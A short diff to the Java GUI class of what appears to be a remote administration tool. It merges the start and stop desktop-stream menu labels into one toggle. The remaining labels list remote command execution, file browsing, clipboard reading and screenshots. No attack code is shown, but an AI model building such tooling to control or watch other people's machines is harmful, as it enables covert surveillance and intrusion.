@@ -48,8 +48,7 @@ public final class RattyGui {
 	
 	public static final String POPUP = "Open popup";
 	public static final String SCREENSHOT = "Take screenshot";
-	public static final String DESKTOP = "Start desktop stream";
-	public static final String DESKTOP_STOP = "Stop desktop stream";
+	public static final String DESKTOP = "Toggle desktop stream";
 	public static final String FILES = "Browse files";
 	public static final String COMMAND = "Execute command";
 	public static final String CLIPBOARD = "Get clipboard content";
@@ -60,7 +59,6 @@ public final class RattyGui {
 		POPUP,
 		SCREENSHOT,
 		DESKTOP,
-		DESKTOP_STOP,
 		FILES,
 		COMMAND,
 		CLIPBOARD,
